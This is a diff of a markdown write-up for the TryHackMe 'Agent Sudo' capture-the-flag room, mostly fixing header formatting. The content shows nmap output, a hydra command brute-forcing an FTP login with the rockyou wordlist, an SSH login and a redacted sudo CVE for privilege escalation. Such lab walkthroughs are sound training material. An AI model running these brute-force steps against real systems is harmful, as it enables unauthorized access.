@@ -1,6 +1,8 @@
-#Agent Sudo
+# Agent Sudo
 
-https://tryhackme.com/room/agentsudoctf
+[Link to room](https://tryhackme.com/room/agentsudoctf)
+
+###### Enumeration
 
 ```nmap
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 04:35 EDT
@@ -22,8 +24,9 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 35.41 seconds
 ```
-##Enumration
+
 1. 3
+
 2. 
 ```change user-agent by firefox add-on (user agent switcher to C)
 user-?????
@@ -33,7 +36,7 @@ user-?????
 <redacted>
 ```
 
-##Hash Cracking and brute-forcing
+## Hash Cracking and brute-forcing
 ```bash
 hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://agent-sudo
 ```
@@ -90,7 +93,7 @@ chris
 <redacted>
 ```
 
-##Capture the user flag
+## Capture the user flag
 1. 
 ```bash
 ssh james@agent-sudo
@@ -102,7 +105,7 @@ ssh james@agent-sudo
 ****** alien ******
 ```
 
-##Privilege Escalation
+## Privilege Escalation
 
 ```firefox cve sudo
 CVE-2019-*****
